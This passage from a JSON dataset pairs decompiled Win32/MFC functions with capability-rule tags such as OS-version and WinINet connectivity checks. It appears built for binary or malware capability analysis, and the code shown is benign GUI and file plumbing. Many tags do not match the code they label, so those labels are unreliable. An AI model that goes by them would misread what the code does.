*arg_8h, iVar3, 0, puVar6);\n                if (iVar4 == -1) {\n                    var_4h = 0;\n                }\n            }\n            else {\n                puVar6 = puVar5;\n                if (iVar3 == 0x401) {\n                    iVar3 = 0x180;\n                    goto code_r0x0041fc47;\n                }\n                if (iVar3 == 0x403) {\n                    iVar3 = 0x143;\n                }\n                if (iVar3 == 0x401) goto code_r0x0041fc19;\n                if ((iVar3 == 0x180) || (iVar3 == 0x143)) goto code_r0x0041fc47;\n            }\n            arg_8h = puVar5 + iVar1;\n        } while (var_4h != 0);\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    fcn.0041f244(*(in_ECX + 0x1c), 0x364, 0, 0, 0, 0);\n    return var_4h;\n}\n",
        "token_count": 547
    },
    "004201d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004201d1(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.0041db87(param_2);\n    if (iVar1 != 0) {\n        (**(*param_1 + 0x50))();\n        piVar2 = (**(*param_1 + 0x80))();\n        uVar3 = fcn.0041dc1e();\n        iVar1 = (*_sym.imp.USER32.dll_SetWindowLongA)(unaff_retaddr, 0xfffffffc, uVar3);\n        if (*piVar2 == 0) {\n            *piVar2 = iVar1;\n        }\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 194
    },
    "00420524": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420524(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((param_1 != 0) && (*(param_1 + 0x38) == 0)) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x1c));\n        iVar2 = fcn.0041b9a4(uVar1);\n        if ((iVar2 != 0) && (*(iVar2 + 0x34) != NULL)) {\n            (**(**(iVar2 + 0x34) + 0x8c))(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00420561": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00420561(int32_t param_1, int32_t param_2)\n\n{\n    if ((*(param_1 + 0x38) == 0) && (*(param_2 + 0x34) != NULL)) {\n        (**(**(param_2 + 0x34) + 0x8c))(param_1);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "004205ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004205ae(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_104h;\n    uint var_4h;\n    \n    iVar1 = fcn.00420632(arg_8h, &var_104h, 0x100);\n    if (0x100U - iVar1 < 3) {\n        iVar2 = 0x100;\n        do {\n            iVar3 = iVar2 + 0x100;\n            fcn.0041d546(iVar2 + 0xff, iVar3);\n            iVar1 = fcn.00420632();\n            iVar2 = iVar3;\n        } while (iVar3 - iVar1 < 3);\n        fcn.0041d595(0xffffffff);\n    }\n    else {\n        fcn.0041d402(&var_104h);\n    }\n    return 0 < iVar1;\n}\n",
        "token_count": 210
    },
    "00420659": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00420659(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar1 = fcn.0042401d();\n    if ((*(iVar1 + 0x18) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0041bcf2(0x4225f0);\n        iVar3 = fcn.0041bd04(0x48);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004209ee(0x42a6b8, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x18) = uVar4;\n        fcn.0041bcf2(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x18);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 354
    },
    "00420728": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00420728(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.004206fe();\n    uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 85
    },
    "00420753": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00420753(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        iVar1 = fcn.00420741(param_1);\n        if (iVar1 != 0) {\n            return param_1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 80
    },
    "00420893": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420893(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    uVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xb);\n    *(param_1 + 8) = uVar2;\n    uVar2 = (*pcVar1)(0xc);\n    *(param_1 + 0xc) = uVar2;\n    if (*(param_1 + 0x68) == 0) {\n        fcn.00424c27();\n    }\n    else {\n        fcn.00424bf7();\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n    pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n    uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar2, 0x58);\n    *(param_1 + 0x18) = uVar3;\n    uVar3 = (*pcVar1)(uVar2, 0x5a);\n    *(param_1 + 0x1c) = uVar3;\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    return;\n}\n",
        "token_count": 289
    },
    "004208f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004208f4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    iVar1 = fcn.0042401d();\n    if ((*(iVar1 + 0x10) != 0) && (iVar2 = *(iVar1 + 0x10) + -1,  *(iVar1 + 0x10) = iVar2,  iVar2 == 0)) {\n        if (arg_8h != 0) {\n            if (arg_8h != -1) {\n                iVar2 = fcn.0041bd38();\n                if ((iVar2 != 0) && (*(iVar2 + 0x54) != NULL)) {\n                    (**(iVar2 + 0x54))(0, 0);\n                }\n            }\n            fcn.00420b12();\n            fcn.00420b12();\n            fcn.00420b12();\n            fcn.00420b12();\n            fcn.00420b12();\n        }\n        iVar2 = fcn.00423ff7();\n        iVar2 = *(iVar2 + 4);\n        iVar3 = fcn.00424808(0x423997);\n        if (iVar2 != 0) {\n            if (*(iVar3 + 0xc) != 0) {\n                uVar4 = fcn.0040c5bb(*(iVar3 + 0xc));\n                if (*(iVar2 + 0xb8) <= uVar4) goto code_r0x004209df;\n            }\n            if (*(iVar2 + 0xb8) != 0) {\n                arg_8h = 0;\n                if (*(iVar3 + 0xc) != 0) {\n                    arg_8h = fcn.0040c5bb(*(iVar3 + 0xc));\n                    fcn.0040b942(*(iVar3 + 0xc));\n                }\n                iVar2 = fcn.0040ae6e(*(iVar2 + 0xb8));\n                *(iVar3 + 0xc) = iVar2;\n                if ((iVar2 == 0) && (arg_8h != 0)) {\n                    uVar5 = fcn.0040ae6e(arg_8h);\n                    *(iVar3 + 0xc) = uVar5;\n                }\n            }\n        }\n    }\ncode_r0x004209df:\n    return *(iVar1 + 0x10) != 0;\n}\n",
        "token_count": 560
    },
    "00420a53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00420a53(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_8h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    if (arg_8h_00 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.0041b9a4(arg_8h_00);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0041b9a4(arg_8h_00);\n            if (iVar2 == 0) {\n                uVar3 = fcn.0041bcf2(0x4225f0);\n                *(unaff_EBP + -4) = 0;\n                *(unaff_EBP + 8) = uVar3;\n                iVar2 = fcn.00420773();\n                if (iVar2 == 0) {\n                    fcn.0041b368();\n                }\n                piVar4 = fcn.0041b9f9(arg_8h_00);\n                uVar3 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0xffffffff;\n                *piVar4 = iVar2;\n                fcn.0041bcf2(uVar3);\n                iVar1 = *(extraout_ECX + 0x40);\n                *(iVar1 + iVar2) = arg_8h_00;\n                if (*(extraout_ECX + 0x44) == 2) {\n                    *(iVar1 + iVar2 + 4) = arg_8h_00;\n                }\n            }\n            else {\n                iVar1 = *(extraout_ECX + 0x40);\n                *(iVar1 + iVar2) = arg_8h_00;\n                if (*(extraout_ECX + 0x44) == 2) {\n                    *(iVar1 + iVar2 + 4) = arg_8h_00;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar2;\n}\n",
        "token_count": 616
    },
    "00420b12": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420b12(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    if (param_1 != 0) {\n        var_8h = -(*(param_1 + 0x2c) != 0);\n        while (var_8h != 0) {\n            fcn.0041ba8b(&var_8h, &var_ch, &var_4h);\n            puVar1 = *(param_1 + 0x40) + var_4h;\n            *puVar1 = 0;\n            if (*(param_1 + 0x44) == 2) {\n                puVar1[1] = 0;\n            }\n            if (var_4h != NULL) {\n                (**(*var_4h + 4))(1);\n            }\n        }\n        fcn.0041b8b8();\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "00420d97": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420d97(uint lpMultiByteStr, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint *in_ECX;\n    int32_t iVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    uint32_t arg_8h;\n    uint lpWideCharStr;\n    ushort *var_10h;\n    uint32_t var_ch;\n    uint *hMem;\n    uint32_t var_4h;\n    \n    if (in_ECX[1] == 0) {\n        uVar1 = 0;\n    }\n    else {\n        hMem = in_ECX;\n        puVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*in_ECX);\n        var_4h = *(puVar2 + 2) == -1;\n        if (*(puVar2 + 2) == -1) {\n            var_ch = puVar2[3];\n        }\n        else {\n            var_ch = *puVar2;\n        }\n        var_ch = var_ch & 0x40;\n        iVar7 = (-(var_4h != 0) & 2) + 1;\n        if (var_4h == 0) {\n            *puVar2 = *puVar2 | 0x40;\n        }\n        else {\n            puVar2[3] = puVar2[3] | 0x40;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, &lpWideCharStr, 0x20);\n        iVar3 = iVar7 * 2 + iVar3 * 2;\n        puVar4 = fcn.00420c1a(puVar2);\n        iVar5 = 0;\n        var_10h = puVar4;\n        if (var_ch != 0) {\n            iVar5 = fcn.0040be85(puVar4 + iVar7);\n            iVar5 = iVar7 * 2 + 2 + iVar5 * 2;\n        }\n        var_ch = iVar5 + 3 + puVar4 & 0xfffffffc;\n        arg_8h = puVar4 + iVar3 + 3 & 0xfffffffc;\n        if (var_4h == 0) {\n            iVar6 = *(puVar2 + 2);\n        }\n        else {\n            iVar6 = *(puVar2 + 4);\n        }\n        if ((iVar3 != iVar5) && (iVar6 != 0)) {\n            fcn.0040b2d0(arg_8h, var_ch, puVar2 + (hMem[1] - var_ch));\n        }\n        *var_10h = arg_ch;\n        fcn.0040b2d0(var_10h + iVar7, &lpWideCharStr, iVar3 + iVar7 * -2);\n        hMem[1] = hMem[1] + (arg_8h - var_ch);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*hMem);\n        hMem[2] = 0;\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 716
    },
    "00420eb1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420eb1(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    char *lpMultiByteStr;\n    int32_t lpvObject;\n    uint var_24h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    uVar4 = 10;\n    lpMultiByteStr = \"System\";\n    iVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0xd);\n        if (iVar2 == 0) goto code_r0x00420f25;\n    }\n    iVar2 = (*_sym.imp.GDI32.dll_GetObjectA)(iVar2, 0x3c, &lpvObject);\n    if (iVar2 != 0) {\n        lpMultiByteStr = &var_24h;\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(0);\n        if (lpvObject < 0) {\n            lpvObject = -lpvObject;\n        }\n        uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar3, 0x5a);\n        uVar4 = (*_sym.imp.KERNEL32.dll_MulDiv)(lpvObject, 0x48, uVar4);\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar3);\n    }\ncode_r0x00420f25:\n    if (arg_8h == 0) {\n        arg_8h = uVar4;\n    }\n    fcn.00420d97(lpMultiByteStr, arg_8h);\n    return;\n}\n",
        "token_count": 394
    },
    "00420f97": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00420f97(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFile.0;\n    pcVar1 = extraout_ECX[1];\n    *(unaff_EBP + -4) = 1;\n    if ((pcVar1 != 0xffffffff) && (extraout_ECX[2] != NULL)) {\n        fcn.0042126f();\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.0041d2bd();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 227
    },
    "0042169f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042169f(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    fcn.0040b990(arg_8h, 0, 0x118);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_8h + 0x12, *(in_ECX + 0xc), 0x104);\n    if (*(in_ECX + 4) == -1) {\ncode_r0x0042176f:\n        uVar2 = 1;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetFileTime)\n                          (*(in_ECX + 4), &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        if (iVar1 != 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetFileSize)(*(in_ECX + 4), 0);\n            arg_8h[3] = iVar1;\n            if (iVar1 != -1) {\n                if (*(*(in_ECX + 0xc) + -8) == 0) {\ncode_r0x00421713:\n                    *(arg_8h + 4) = 0;\n                }\n                else {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(*(in_ECX + 0xc));\n                    if (iVar1 == -1) goto code_r0x00421713;\n                    *(arg_8h + 4) = iVar1;\n                }\n                piVar3 = fcn.0041b432(&lpCreationTime, 0xffffffff);\n                *arg_8h = *piVar3;\n                piVar3 = fcn.0041b432(&lpLastAccessTime, 0xffffffff);\n                arg_8h[2] = *piVar3;\n                piVar3 = fcn.0041b432(&lpLastWriteTime, 0xffffffff);\n                iVar1 = *piVar3;\n                arg_8h[1] = iVar1;\n                if (*arg_8h == 0) {\n                    *arg_8h = iVar1;\n                }\n                if (arg_8h[2] == 0) {\n                    arg_8h[2] = arg_8h[1];\n                }\n                goto code_r0x0042176f;\n            }\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 578
    },
    "00421779": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00421779(int32_t param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t arg_10h;\n    \n    if (param_1 != 0) {\n        arg_10h = param_1;\n        arg_8h = fcn.004218a5(param_1, param_1, param_2);\n        fcn.0042183a(arg_8h, param_1, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00421bdc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00421bdc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar1 = fcn.0042401d();\n    if ((*(iVar1 + 0x1c) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0041bcf2(0x4225f0);\n        iVar3 = fcn.0041bd04(0x48);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004209ee(0x42a758, 4, 2);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x1c) = uVar4;\n        fcn.0041bcf2(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x1c);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 356
    },
    "00421ccb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00421ccb(void)\n\n{\n    uint uVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDC.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[1] != NULL) {\n        uVar1 = fcn.00421c9a(extraout_ECX);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 204
    },
    "0042237f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042237f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar1 = fcn.0042401d();\n    if ((*(iVar1 + 0x20) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0041bcf2(0x4225f0);\n        iVar3 = fcn.0041bd04(0x48);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004209ee(0x42a730, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x20) = uVar4;\n        fcn.0041bcf2(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x20);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 353
    },
    "00422430": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00422430(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.00422406();\n    uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "0042245f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.0042245f(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t hWnd;\n    uint32_t var_4h;\n    uint lpClassName;\n    \n    if ((hWnd != 0) && (uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar1 & 0xf) == var_4h)) {\n        (*_sym.imp.USER32.dll_GetClassNameA)(hWnd, &lpClassName, 10);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(&lpClassName, \"combobox\");\n        return iVar2 == 0;\n    }\n    return false;\n}\n",
        "token_count": 175
    },
    "0042271e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042271e(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    if ((*(extraout_ECX + 0x20) != 0) && ((*(extraout_ECX + 0x14) & 2) == 0)) {\n        fcn.004227a6();\n    }\n    fcn.00422764();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041d2bd();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 220
    },
    "004227b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004227b4(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_ch == 0) {\n        iVar1 = 0;\n    }\n    else {\n        uVar3 = *(in_ECX + 0x28) - *(in_ECX + 0x24);\n        if (arg_ch < uVar3) {\n            uVar3 = arg_ch;\n        }\n        fcn.0040bb50(arg_8h, *(in_ECX + 0x24), uVar3);\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + uVar3;\n        arg_8h = arg_8h + uVar3;\n        uVar3 = arg_ch - uVar3;\n        if (uVar3 != 0) {\n            iVar1 = uVar3 - uVar3 % *(in_ECX + 0x1c);\n            var_8h = 0;\n            var_4h = iVar1;\n            do {\n                iVar2 = (**(**(in_ECX + 0x20) + 0x34))(arg_8h, var_4h);\n                arg_8h = arg_8h + iVar2;\n                var_8h = var_8h + iVar2;\n                var_4h = var_4h - iVar2;\n                if (iVar2 == 0) break;\n            } while (var_4h != 0);\n            